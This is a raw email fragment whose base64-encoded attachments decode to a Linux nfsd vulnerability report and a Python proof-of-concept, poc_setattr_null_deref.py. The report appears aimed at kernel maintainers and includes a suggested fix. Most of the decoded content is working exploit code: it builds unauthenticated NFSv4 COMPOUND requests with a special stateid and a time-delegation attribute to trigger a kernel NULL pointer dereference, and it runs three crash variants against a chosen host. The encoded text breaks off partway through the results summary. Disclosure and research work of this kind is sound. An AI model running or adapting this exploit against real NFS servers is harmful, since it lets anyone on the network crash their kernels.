dGFtcCB2ZXR0aW5nCiAgICAgICAgICAgICAgICAgYnV0IGRpZCBOT1QgYWRkcmVzcyB0aGlzIG51
bGwgZGVyZWZlcmVuY2UKVW5maXhlZCBpbjoga2VybmVsIDYuMTcuOCAoY29uZmlybWVkKSBhbmQg
Y3VycmVudCBtYWlubGluZSA3LjEtZGV2CgpBdHRhY2sgc3VyZmFjZQotLS0tLS0tLS0tLS0tLQpB
bnkgTkZTdjQgY2xpZW50IHdpdGggbmV0d29yayBhY2Nlc3MgdG8gdGhlIHNlcnZlci4KTm8gYXV0
aGVudGljYXRpb24sIGRlbGVnYXRpb24sIG9wZW4gZmlsZSwgb3IgcHJpb3Igc3RhdGUgcmVxdWly
ZWQuClRyaWdnZXI6IG9uZSBDT01QT1VORCBSUEMgd2l0aCBTRVRBVFRSICsgVElNRV9ERUxFRyBh
dHRyaWJ1dGUgKyBzcGVjaWFsIHN0YXRlaWQuCg==
--000000000000cf8723065412c631
Content-Type: text/x-python-script; charset="UTF-8"; name="poc_setattr_null_deref.py"
Content-Disposition: attachment; filename="poc_setattr_null_deref.py"
Content-Transfer-Encoding: base64
Content-ID: <f_mqb9kyu02>
X-Attachment-Id: f_mqb9kyu02

IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiIKTlVMTCBwb2ludGVyIGRlcmVmZXJlbmNlIGluIG5m
c2Q0X3NldGF0dHIoKSB2aWEgVElNRV9ERUxFR19BQ0NFU1MgKyBPTkVfU1RBVEVJRAoKQWZmZWN0
ZWQgY29kZTogZnMvbmZzZC9uZnM0cHJvYy5jLCBuZnNkNF9zZXRhdHRyKCkKCkJ1ZzoKICAgIFdo
ZW4gYSBTRVRBVFRSIHJlcXVlc3QgaW5jbHVkZXMgRkFUVFI0X1dPUkQyX1RJTUVfREVMRUdfQUND
RVNTIG9yCiAgICBGQVRUUjRfV09SRDJfVElNRV9ERUxFR19NT0RJRlkgaW4gdGhlIGF0dHJpYnV0
ZSBiaXRtYXAsIG5mc2Q0X3NldGF0dHIoKQogICAgc2V0cyBgZGVsZWdfYXR0cnMgPSB0cnVlYCBh
bmQgY2FsbHMgbmZzNF9wcmVwcm9jZXNzX3N0YXRlaWRfb3AoKSB0bwogICAgdmFsaWRhdGUgdGhl
IHN0YXRlaWQuCgogICAgSWYgdGhlIGNsaWVudCB1c2VzIHRoZSBORlN2NCAib25lIHN0YXRlaWQi
ICgweEZGRkZGRi4uLkZGKSwgdGhlIGZ1bmN0aW9uCiAgICBkaXNwYXRjaGVzIHRvIGNoZWNrX3Nw
ZWNpYWxfc3RhdGVpZHMoKSwgd2hpY2ggZm9yIGEgc3RhdGVpZCB3aXRoIGJvdGgKICAgIFdSX1NU
QVRFIGFuZCBSRF9TVEFURSBmbGFncyByZXR1cm5zIG5mc19vayAqd2l0aG91dCogc2V0dGluZyB0
aGUgb3V0cHV0CiAgICBuZnM0X3N0aWQgcG9pbnRlci4gVGhlIGxvY2FsIHZhcmlhYmxlIGBzdGAg
cmVtYWlucyBOVUxMLgoKICAgIEJhY2sgaW4gbmZzZDRfc2V0YXR0cigpOgoKICAgICAgICBpZiAo
ZGVsZWdfYXR0cnMpIHsKICAgICAgICAgICAgc3RhdHVzID0gbmZzZXJyX2JhZF9zdGF0ZWlkOwog
ICAgICAgICAgICBpZiAoc3QtPnNjX3R5cGUgJiBTQ19UWVBFX0RFTEVHKSB7ICAgLy8gTlVMTCBE
RVJFRjogc3QgPT0gTlVMTAoKICAgIFRoaXMgZGVyZWZlcmVuY2VzIE5VTEwgKHN0cnVjdCBvZmZz
ZXQgfjQpLCB0cmlnZ2VyaW5nIGEga2VybmVsIG9vcHMuCgpSb290IGNhdXNlOgogICAgY2hlY2tf
c3BlY2lhbF9zdGF0ZWlkcygpIGNvcnJlY3RseSByZXR1cm5zIG5mc19vayBmb3Igb25lX3N0YXRl
aWQrUkRfU1RBVEUKICAgIHBlciBSRkMgNzUzMCDCpzguMi4gVGhlIHByb2JsZW0gaXMgdGhhdCBu
ZnNkNF9zZXRhdHRyKCkgZG9lc24ndCBndWFyZCB0aGUKICAgIGRlbGVnX2F0dHJzIGJsb2NrIGFn
YWluc3Qgc3Q9PU5VTEwuCgpBdHRhY2sgdmVjdG9yOgogICAgQW55IE5GU3Y0IGNsaWVudCB0aGF0
IGNhbiByZWFjaCB0aGUgc2VydmVyIGNhbiB0cmlnZ2VyIHRoaXMuICBObwogICAgYXV0aGVudGlj
YXRpb24sIGRlbGVnYXRpb25zLCBvciBwcmlvciBzdGF0ZSByZXF1aXJlZC4KClRyaWdnZXIgY29u
ZGl0aW9uOgogICAgQ09NUE9VTkQgWwogICAgICAgIFBVVFJPT1RGSCwKICAgICAgICBTRVRBVFRS
KAogICAgICAgICAgICBzdGF0ZWlkID0gT05FX1NUQVRFSUQsICAvLyBhbGwtMHhGRiBieXRlcwog
ICAgICAgICAgICBhdHRycyAgID0geyBGQVRUUjRfV09SRDJfVElNRV9ERUxFR19BQ0NFU1M6IG5m
c3RpbWU0ezAsMH0gfQogICAgICAgICkKICAgIF0KCkV4cGVjdGVkIHJlc3VsdDoKICAgIEtlcm5l
bCBvb3BzOiBCVUc6IGtlcm5lbCBOVUxMIHBvaW50ZXIgZGVyZWZlcmVuY2UsIGFkZHJlc3M6IDB4
MDAwMDAwMDQKICAgIGluIG5mc2Q0X3NldGF0dHIgKGZzL25mc2QvbmZzNHByb2MuYykKCkZpeCAo
Y29uY2VwdHVhbCk6CiAgICBJbiBuZnNkNF9zZXRhdHRyKCksIGd1YXJkIHRoZSBkZWxlZ2F0aW9u
IGF0dHJpYnV0ZSBibG9jazoKCiAgICAgICAgaWYgKGRlbGVnX2F0dHJzKSB7CiAgICAgICAgICAg
IHN0YXR1cyA9IG5mc2Vycl9iYWRfc3RhdGVpZDsKICAgICsgICAgICAgaWYgKHN0ICYmIHN0LT5z
Y190eXBlICYgU0NfVFlQRV9ERUxFRykgewogICAgLSAgICAgICBpZiAoc3QtPnNjX3R5cGUgJiBT
Q19UWVBFX0RFTEVHKSB7CiAgICAgICAgICAgICAgICAuLi4KICAgICAgICAgICAgfQogICAgICAg
IH0KCiAgICBPciBhbHRlcm5hdGl2ZWx5LCByZWplY3Qgc3BlY2lhbCBzdGF0ZWlkcyBlYXJsaWVy
IHdoZW4gZGVsZWdfYXR0cnMgaXMgc2V0LgoKVXNhZ2U6CiAgICAudmVudi9iaW4vcHl0aG9uIHRv
b2xzL3BvY19zZXRhdHRyX251bGxfZGVyZWYucHkgLS1zZXJ2ZXIgMTI3LjAuMC4xIC0tcG9ydCAy
MDQ5CgogICAgTW9uaXRvcjogc3NoIHJvb3RAbG9jYWxob3N0IC1wIDIyMjQgJ2RtZXNnIC13IHwg
Z3JlcCAtRSAiQlVHfE5VTEx8bmZzZCInCiIiIgoKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0
IHN0cnVjdAppbXBvcnQgYXJncGFyc2UKc3lzLnBhdGguaW5zZXJ0KDAsIG9zLnBhdGguZGlybmFt
ZShfX2ZpbGVfXykpCgpmcm9tIHJwY19jbGllbnQgaW1wb3J0ICgKICAgIFJQQ0NsaWVudCwgWERS
UmVhZGVyLAogICAgeGRyX3VpbnQsIHhkcl91aW50NjQsIHhkcl9vcGFxdWUsIHhkcl9zdHJpbmcs
IHhkcl9ib29sLCBhdXRoX251bGwsCikKZnJvbSBuZnM0X2NsaWVudCBpbXBvcnQgKAogICAgTkZT
NENsaWVudCwgTkZTNEVycm9yLCBORlM0X09LLAogICAgTkZTNEVSUl9CQURfU1RBVEVJRCwKICAg
IENvbXBvdW5kQnVpbGRlciwKICAgIHN0YXR1c19uYW1lLAopCgojIOKUgOKUgCBORlN2NCBjb25z
dGFudHMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSACgpPUF9TRVRBVFRSICAgICA9IDM0Ck9QX1BVVFJPT1RGSCAgID0gMjQK
CiMgQml0bWFwIHBvc2l0aW9ucyAoRkFUVFI0X1dPUkQyIGJpdHMpCkZBVFRSNF9XT1JEMl9USU1F
X0RFTEVHX0FDQ0VTUyA9ICgxIDw8IDIwKSAgICMgYml0IDg0OiBGQVRUUjRfVElNRV9ERUxFR19B
Q0NFU1MgLSA2NApGQVRUUjRfV09SRDJfVElNRV9ERUxFR19NT0RJRlkgPSAoMSA8PCAyMSkgICAj
IGJpdCA4NTogRkFUVFI0X1RJTUVfREVMRUdfTU9ESUZZIC0gNjQKCiMgU3BlY2lhbCBzdGF0ZWlk
cwpaRVJPX1NUQVRFSUQgPSBiJ1x4MDAnICogMTYgICAjIGFsbCB6ZXJvczoge3NlcWlkPTAsIG90
aGVyPTAuLi4wfQpPTkVfU1RBVEVJRCAgPSBiJ1x4ZmYnICogMTYgICAjIGFsbCBvbmVzOiAge3Nl
cWlkPTB4RkZGRkZGRkYsIG90aGVyPTB4RkYuLi5GRn0KCgpkZWYgZW5jb2RlX29uZV9zdGF0ZWlk
KCkgLT4gYnl0ZXM6CiAgICAiIiJFbmNvZGUgdGhlIE5GU3Y0ICdvbmUgc3RhdGVpZCcgKGFsbC0w
eEZGKS4iIiIKICAgIHJldHVybiBPTkVfU1RBVEVJRAoKCmRlZiBlbmNvZGVfemVyb19zdGF0ZWlk
KCkgLT4gYnl0ZXM6CiAgICAiIiJFbmNvZGUgdGhlIE5GU3Y0ICd6ZXJvIHN0YXRlaWQnIChhbGwt
MHgwMCkuIiIiCiAgICByZXR1cm4gWkVST19TVEFURUlECgoKZGVmIGVuY29kZV9uZnN0aW1lNChz
ZWNvbmRzOiBpbnQgPSAwLCBuc2Vjb25kczogaW50ID0gMCkgLT4gYnl0ZXM6CiAgICAiIiJFbmNv
ZGUgbmZzdGltZTQgPSB7aW50NjQgc2Vjb25kcywgdWludDMyIG5zZWNvbmRzfS4iIiIKICAgIHJl
dHVybiBzdHJ1Y3QucGFjaygiPnFJIiwgc2Vjb25kcywgbnNlY29uZHMpICAjIDEyIGJ5dGVzCgoK
ZGVmIGVuY29kZV9mYXR0cjRfYml0bWFwX2FuZF9kYXRhKHdvcmQwOiBpbnQsIHdvcmQxOiBpbnQs
IHdvcmQyOiBpbnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9kYXRh
OiBieXRlcykgLT4gYnl0ZXM6CiAgICAiIiIKICAgIEVuY29kZSBmYXR0cjQgPSB7Yml0bWFwNCwg
b3BhcXVlPD4gYXR0cmxpc3R9LgogICAgQml0bWFwIGlzIGVuY29kZWQgYXMgYW4gYXJyYXkgb2Yg
dWludDMycy4KICAgICIiIgogICAgIyBEZXRlcm1pbmUgaG93IG1hbnkgYml0bWFwIHdvcmRzIHRv
IGluY2x1ZGUgKHRyaW0gdHJhaWxpbmcgemVyb3MpCiAgICB3b3JkcyA9IFt3b3JkMCwgd29yZDEs
IHdvcmQyXQogICAgd2hpbGUgd29yZHMgYW5kIHdvcmRzWy0xXSA9PSAwOgogICAgICAgIHdvcmRz
LnBvcCgpCiAgICBpZiBub3Qgd29yZHM6CiAgICAgICAgd29yZHMgPSBbMF0gICMgYXQgbGVhc3Qg
b25lIHdvcmQKCiAgICBiaXRtYXAgPSB4ZHJfdWludChsZW4od29yZHMpKQogICAgZm9yIHcgaW4g
d29yZHM6CiAgICAgICAgYml0bWFwICs9IHhkcl91aW50KHcpCgogICAgcmV0dXJuIGJpdG1hcCAr
IHhkcl9vcGFxdWUoYXR0cl9kYXRhKQoKCmRlZiBvcF9wdXRyb290ZmgoKSAtPiBieXRlczoKICAg
IHJldHVybiB4ZHJfdWludChPUF9QVVRST09URkgpCgoKZGVmIG9wX3NldGF0dHJfdGltZV9kZWxl
ZyhzdGF0ZWlkOiBieXRlcywgdXNlX21vZGlmeV9iaXQ6IGJvb2wgPSBGYWxzZSkgLT4gYnl0ZXM6
CiAgICAiIiIKICAgIEVuY29kZSBTRVRBVFRSIHdpdGggVElNRV9ERUxFR19BQ0NFU1MgKG9yIE1P
RElGWSkgYXR0cmlidXRlIGFuZCBnaXZlbiBzdGF0ZWlkLgoKICAgIFRoaXMgaXMgdGhlIGNyYXNo
IHRyaWdnZXI6CiAgICAgICAgLSBzdGF0ZWlkID0gT05FX1NUQVRFSUQgIOKGkiAgY2hlY2tfc3Bl
Y2lhbF9zdGF0ZWlkcyByZXR1cm5zIG5mc19vawogICAgICAgIC0gRkFUVFI0X1dPUkQyX1RJTUVf
REVMRUdfQUNDRVNTIGluIGJtdmFsWzJdICDihpIgIGRlbGVnX2F0dHJzPVRydWUKICAgICAgICAt
IG5mc2Q0X3NldGF0dHIgZGVyZWZlcmVuY2VzIHN0LT5zY190eXBlIHdoZXJlIHN0PT1OVUxMICDi
hpIgIG9vcHMKICAgICIiIgogICAgYXNzZXJ0IGxlbihzdGF0ZWlkKSA9PSAxNiwgInN0YXRlaWQg
bXVzdCBiZSAxNiBieXRlcyIKCiAgICBpZiB1c2VfbW9kaWZ5X2JpdDoKICAgICAgICB3b3JkMl9i
aXQgPSBGQVRUUjRfV09SRDJfVElNRV9ERUxFR19NT0RJRlkKICAgIGVsc2U6CiAgICAgICAgd29y
ZDJfYml0ID0gRkFUVFI0X1dPUkQyX1RJTUVfREVMRUdfQUNDRVNTCgogICAgYXR0cl9kYXRhID0g
ZW5jb2RlX25mc3RpbWU0KHNlY29uZHM9MCwgbnNlY29uZHM9MCkKICAgIGZhdHRyID0gZW5jb2Rl
X2ZhdHRyNF9iaXRtYXBfYW5kX2RhdGEoMCwgMCwgd29yZDJfYml0LCBhdHRyX2RhdGEpCgogICAg
cmV0dXJuIHhkcl91aW50KE9QX1NFVEFUVFIpICsgc3RhdGVpZCArIGZhdHRyCgoKIyDilIDilIAg
TWFudWFsIGNvbXBvdW5kIGJ1aWxkZXIgKGJ5cGFzc2VzIE5GUzRDbGllbnQncyBzZXNzaW9uIGxh
eWVyKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKCmRlZiBidWlsZF9j
b21wb3VuZF92NChvcHM6IGxpc3RbYnl0ZXNdLCB0YWc6IHN0ciA9IGIicG9jIikgLT4gYnl0ZXM6
CiAgICAiIiIKICAgIEJ1aWxkIGEgcmF3IE5GU3Y0LjAgQ09NUE9VTkQgcmVxdWVzdCBib2R5Lgog
ICAgTkZTdjQuMCBDT01QT1VORCBhcmdzOgogICAgICBvcGFxdWU8ND4gdGFnCiAgICAgIHVpbnQz
MiAgICBtaW5vcnZlcnNpb24gPSAwCiAgICAgIHVpbnQzMiAgICBhcmdhcnJheV9jb3VudAogICAg
ICBuZnNfYXJnb3A0W10gYXJnYXJyYXkKICAgICIiIgogICAgb3BzX2RhdGEgPSBiIiIuam9pbihv
cHMpCiAgICBvcF9jb3VudCA9IGxlbihvcHMpCgogICAgcmV0dXJuICgKICAgICAgICB4ZHJfb3Bh
cXVlKHRhZyBpZiBpc2luc3RhbmNlKHRhZywgYnl0ZXMpIGVsc2UgdGFnLmVuY29kZSgpKQogICAg
ICAgICsgeGRyX3VpbnQoMCkgICAgICAgICAgICMgbWlub3J2ZXJzaW9uID0gMAogICAgICAgICsg
eGRyX3VpbnQob3BfY291bnQpCiAgICAgICAgKyBvcHNfZGF0YQogICAgKQoKCmRlZiBzZW5kX2Nv
bXBvdW5kKGNsaWVudDogUlBDQ2xpZW50LCBvcHM6IGxpc3RbYnl0ZXNdLCB0YWc6IHN0ciA9IGIi
cG9jIikgLT4gYnl0ZXM6CiAgICAiIiJTZW5kIHJhdyBORlN2NC4wIENPTVBPVU5EIGFuZCByZXR1
cm4gcmVwbHkgYnl0ZXMuIiIiCiAgICBib2R5ID0gYnVpbGRfY29tcG91bmRfdjQob3BzLCB0YWcp
CiAgICAjIE5GUyBwcm9jPTEgaXMgQ09NUE9VTkQ7IHByb2dyYW0vdmVyc2lvbiBhcmUgc2V0IGlu
IFJQQ0NsaWVudC5fX2luaXRfXwogICAgcmVwbHkgPSBjbGllbnQuY2FsbCgxLCBib2R5KQogICAg
cmV0dXJuIHJlcGx5CgoKIyDilIDilIAgQXR0YWNrIHZhcmlhbnRzIOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAoKZGVmIHJ1bl9h
dHRhY2soaG9zdDogc3RyLCBwb3J0OiBpbnQsIHZlcmJvc2U6IGJvb2wgPSBUcnVlKToKICAgIHBy
aW50KGYiWypdIFRhcmdldDoge2hvc3R9Ontwb3J0fSIpCiAgICBwcmludChmIlsqXSBCdWc6IG5m
c2Q0X3NldGF0dHIgTlVMTCBwdHIgZGVyZWYgdmlhIFRJTUVfREVMRUdfQUNDRVNTICsgT05FX1NU
QVRFSUQiKQogICAgcHJpbnQoKQoKICAgIGNsaWVudCA9IFJQQ0NsaWVudChob3N0LCBwb3J0LCBw
cm9ncmFtPTEwMDAwMywgdmVyc2lvbj00KQogICAgY2xpZW50LmNvbm5lY3QoKQogICAgcHJpbnQo
ZiJbKl0gQ29ubmVjdGVkIHRvIE5GUyBzZXJ2ZXIiKQoKICAgIHJlc3VsdHMgPSBbXQoKICAgICMg
4pSA4pSAIFZhcmlhbnQgMTogVElNRV9ERUxFR19BQ0NFU1MgKyBPTkVfU1RBVEVJRCDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIAKICAgIHByaW50KCJbKl0gVmFyaWFudCAxOiBGQVRUUjRfV09S
RDJfVElNRV9ERUxFR19BQ0NFU1MgKyBPTkVfU1RBVEVJRCIpCiAgICBwcmludCgiICAgIEV4cGVj
dGVkOiBrZXJuZWwgb29wcyAoTlVMTCBwdHIgZGVyZWYgYXQgbmZzZDRfc2V0YXR0cjoxMjUzKSIp
CiAgICB0cnk6CiAgICAgICAgb3BzID0gWwogICAgICAgICAgICBvcF9wdXRyb290ZmgoKSwKICAg
ICAgICAgICAgb3Bfc2V0YXR0cl90aW1lX2RlbGVnKE9ORV9TVEFURUlELCB1c2VfbW9kaWZ5X2Jp
dD1GYWxzZSksCiAgICAgICAgXQogICAgICAgIHJlcGx5ID0gc2VuZF9jb21wb3VuZChjbGllbnQs
IG9wcywgdGFnPWIiZGVsZWdfbnVsbF92MSIpCiAgICAgICAgciA9IFhEUlJlYWRlcihyZXBseSkK
ICAgICAgICBfc3RhdHVzID0gci51aW50KCkgICAgICAgIyBDT01QT1VORCBzdGF0dXMKICAgICAg
ICBfdGFnID0gci5vcGFxdWUoKSAgICAgICAgIyB0YWcgKGxlbmd0aC1wcmVmaXhlZCwgcGFkZGVk
KQogICAgICAgIF9vcF9jb3VudCA9IHIudWludCgpCgogICAgICAgICMgUFVUUk9PVEZIIHJlc3Vs
dAogICAgICAgIF9vcDEgPSByLnVpbnQoKQogICAgICAgIHB1dHJvb3RmaF9zdGF0dXMgPSByLnVp
bnQoKQoKICAgICAgICAjIFNFVEFUVFIgcmVzdWx0CiAgICAgICAgX29wMiA9IHIudWludCgpCiAg
ICAgICAgc2V0YXR0cl9zdGF0dXMgPSByLnVpbnQoKQogICAgICAgIHN0YXR1c19zdHIgPSBzdGF0
dXNfbmFtZShzZXRhdHRyX3N0YXR1cykKCiAgICAgICAgcHJpbnQoZiIgICAgUFVUUk9PVEZIOiB7
c3RhdHVzX25hbWUocHV0cm9vdGZoX3N0YXR1cyl9IikKICAgICAgICBwcmludChmIiAgICBTRVRB
VFRSOiAgIHtzdGF0dXNfc3RyfSAoMHh7c2V0YXR0cl9zdGF0dXM6MDh4fSkiKQoKICAgICAgICBp
ZiBzZXRhdHRyX3N0YXR1cyA9PSAwOgogICAgICAgICAgICBwcmludChmIiAgICBbISFdIFNFVEFU
VFIgcmV0dXJuZWQgTkZTNF9PSyDigJQgdW5leHBlY3RlZCEiKQogICAgICAgIGVsaWYgc2V0YXR0
cl9zdGF0dXMgPT0gTkZTNEVSUl9CQURfU1RBVEVJRDogICAjIDEwMDI1CiAgICAgICAgICAgIHBy
aW50KGYiICAgIFsrXSBHb3QgTkZTNEVSUl9CQURfU1RBVEVJRCDigJQgc2VydmVyIHN1cnZpdmVk
IChtYXkgYmUgcGF0Y2hlZCkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiICAg
IFs/XSBHb3Qgc3RhdHVzIHtzdGF0dXNfc3RyfSIpCgogICAgICAgIHJlc3VsdHMuYXBwZW5kKCgi
VjEgQUNDRVNTK09ORSIsIHNldGF0dHJfc3RhdHVzLCAicmVwbGllZCIpKQoKICAgIGV4Y2VwdCBD
b25uZWN0aW9uUmVzZXRFcnJvcjoKICAgICAgICBwcmludChmIiAgICBbISFdIENvbm5lY3Rpb24g
cmVzZXQg4oCUIHNlcnZlciBsaWtlbHkgY3Jhc2hlZCAoT09QUyB0cmlnZ2VyZWQpISIpCiAgICAg
ICAgcmVzdWx0cy5hcHBlbmQoKCJWMSBBQ0NFU1MrT05FIiwgTm9uZSwgImNvbm5lY3Rpb25fcmVz
ZXQiKSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIiAgICBbP10g
RXhjZXB0aW9uOiB7ZX0iKQogICAgICAgIHJlc3VsdHMuYXBwZW5kKCgiVjEgQUNDRVNTK09ORSIs
IE5vbmUsIHN0cihlKSkpCgogICAgIyDilIDilIAgVmFyaWFudCAyOiBUSU1FX0RFTEVHX01PRElG
WSArIE9ORV9TVEFURUlEIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHJpbnQoKQog
ICAgcHJpbnQoIlsqXSBWYXJpYW50IDI6IEZBVFRSNF9XT1JEMl9USU1FX0RFTEVHX01PRElGWSAr
IE9ORV9TVEFURUlEIikKICAgIHRyeToKICAgICAgICBvcHMgPSBbCiAgICAgICAgICAgIG9wX3B1
dHJvb3RmaCgpLAogICAgICAgICAgICBvcF9zZXRhdHRyX3RpbWVfZGVsZWcoT05FX1NUQVRFSUQs
IHVzZV9tb2RpZnlfYml0PVRydWUpLAogICAgICAgIF0KICAgICAgICByZXBseSA9IHNlbmRfY29t
cG91bmQoY2xpZW50LCBvcHMsIHRhZz1iImRlbGVnX251bGxfdjIiKQogICAgICAgIHIgPSBYRFJS
ZWFkZXIocmVwbHkpCiAgICAgICAgX3N0YXR1cyA9IHIudWludCgpCiAgICAgICAgX3RhZyA9IHIu
b3BhcXVlKCkKICAgICAgICBfb3BfY291bnQgPSByLnVpbnQoKQogICAgICAgIF9vcDEgPSByLnVp
bnQoKTsgcHV0cm9vdGZoX3N0YXR1cyA9IHIudWludCgpCiAgICAgICAgX29wMiA9IHIudWludCgp
OyBzZXRhdHRyX3N0YXR1cyA9IHIudWludCgpCgogICAgICAgIHByaW50KGYiICAgIFNFVEFUVFI6
ICAge3N0YXR1c19uYW1lKHNldGF0dHJfc3RhdHVzKX0gKDB4e3NldGF0dHJfc3RhdHVzOjA4eH0p
IikKICAgICAgICByZXN1bHRzLmFwcGVuZCgoIlYyIE1PRElGWStPTkUiLCBzZXRhdHRyX3N0YXR1
cywgInJlcGxpZWQiKSkKCiAgICBleGNlcHQgQ29ubmVjdGlvblJlc2V0RXJyb3I6CiAgICAgICAg
cHJpbnQoZiIgICAgWyEhXSBDb25uZWN0aW9uIHJlc2V0IOKAlCBzZXJ2ZXIgbGlrZWx5IGNyYXNo
ZWQhIikKICAgICAgICByZXN1bHRzLmFwcGVuZCgoIlYyIE1PRElGWStPTkUiLCBOb25lLCAiY29u
bmVjdGlvbl9yZXNldCIpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50
KGYiICAgIFs/XSBFeGNlcHRpb246IHtlfSIpCiAgICAgICAgcmVzdWx0cy5hcHBlbmQoKCJWMiBN
T0RJRlkrT05FIiwgTm9uZSwgc3RyKGUpKSkKCiAgICAjIOKUgOKUgCBWYXJpYW50IDM6IFRJTUVf
REVMRUdfQUNDRVNTICsgWkVST19TVEFURUlEIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAg
IyBPbmx5IHRyaWdnZXJzIGlmIG5vIFNIQVJFX0RFTllfV1JJVEUgY29uZmxpY3RzIG9uIHJvb3Qg
ZXhwb3J0CiAgICBwcmludCgpCiAgICBwcmludCgiWypdIFZhcmlhbnQgMzogRkFUVFI0X1dPUkQy
X1RJTUVfREVMRUdfQUNDRVNTICsgWkVST19TVEFURUlEIikKICAgIHByaW50KCIgICAgKHRyaWdn
ZXJzIGlmIG5vIFNIQVJFX0RFTllfV1JJVEUgY29uZmxpY3Qgb24gcm9vdCkiKQogICAgdHJ5Ogog
ICAgICAgIG9wcyA9IFsKICAgICAgICAgICAgb3BfcHV0cm9vdGZoKCksCiAgICAgICAgICAgIG9w
X3NldGF0dHJfdGltZV9kZWxlZyhaRVJPX1NUQVRFSUQsIHVzZV9tb2RpZnlfYml0PUZhbHNlKSwK
ICAgICAgICBdCiAgICAgICAgcmVwbHkgPSBzZW5kX2NvbXBvdW5kKGNsaWVudCwgb3BzLCB0YWc9
YiJkZWxlZ19udWxsX3YzIikKICAgICAgICByID0gWERSUmVhZGVyKHJlcGx5KQogICAgICAgIF9z
dGF0dXMgPSByLnVpbnQoKQogICAgICAgIF90YWcgPSByLm9wYXF1ZSgpCiAgICAgICAgX29wX2Nv
dW50ID0gci51aW50KCkKICAgICAgICBfb3AxID0gci51aW50KCk7IHB1dHJvb3RmaF9zdGF0dXMg
PSByLnVpbnQoKQogICAgICAgIF9vcDIgPSByLnVpbnQoKTsgc2V0YXR0cl9zdGF0dXMgPSByLnVp
bnQoKQoKICAgICAgICBwcmludChmIiAgICBTRVRBVFRSOiAgIHtzdGF0dXNfbmFtZShzZXRhdHRy
X3N0YXR1cyl9ICgweHtzZXRhdHRyX3N0YXR1czowOHh9KSIpCiAgICAgICAgcmVzdWx0cy5hcHBl
bmQoKCJWMyBBQ0NFU1MrWkVSTyIsIHNldGF0dHJfc3RhdHVzLCAicmVwbGllZCIpKQoKICAgIGV4
Y2VwdCBDb25uZWN0aW9uUmVzZXRFcnJvcjoKICAgICAgICBwcmludChmIiAgICBbISFdIENvbm5l
Y3Rpb24gcmVzZXQg4oCUIHNlcnZlciBsaWtlbHkgY3Jhc2hlZCEiKQogICAgICAgIHJlc3VsdHMu
YXBwZW5kKCgiVjMgQUNDRVNTK1pFUk8iLCBOb25lLCAiY29ubmVjdGlvbl9yZXNldCIpKQogICAg
ZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiICAgIFs/XSBFeGNlcHRpb246
IHtlfSIpCiAgICAgICAgcmVzdWx0cy5hcHBlbmQoKCJWMyBBQ0NFU1MrWkVSTyIsIE5vbmUsIHN0
cihlKSkpCgogICAgY2xpZW50LmRpc2Nvbm5lY3QoKQoKICAgICMg4pSA4pSAIFN1bW1hcnkg4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSACiAgICBwcmludCgpCiAgICBwcmludCgi4pWQIiAqIDYwKQogICAgcHJp
bnQoIiAgUkVTVUxUUyIpCiAgICBwcmludCgi4pWQIiAqIDYwKQogICAgZm9yIHZhcmlhbnQsIHN0
YXR1cywgb3V0Y29tZSBpbiByZXN1bHRzOgogICAgICAgIGlmIG91dGNvbWUgPT0gImNvbm5lY3Rp
b25fcmVzZXQiOgogICAgICAgICAgICB2ZXJkaWN0ID0gIlshIV0gQ1JBU0gg4oCUIGtlcm5lbCBv
b3BzIGxpa2VseSB0cmlnZ2VyZWQiCiAgICAgICAgZWxpZiBvdXRjb21lID09ICJyZXBsaWVkIiBh
bmQgc3RhdHVzID09IDB4MDAwMTAwMTM6CiAgICAgICAgICAgIHZlcmRpY3QgPSAiWytdICBORlM0
RVJSX0JBRF9TVEFURUlEIOKAlCBhcHBlYXJzIHBhdGNoZWQgb3IgdW5hZmZlY3RlZCIKICAgICAg
ICBlbGlmIG91dGNvbWUgPT0gInJlcGxpZWQiOgogICAgICAgICAgICB2ZXJkaWN0ID0gZiJbP10g
IFN0YXR1cyB7c3RhdHVzOiMwMTB4fSDigJQge3N0YXR1c19uYW1lKHN0YXR1cyl9IgogICAgICAg
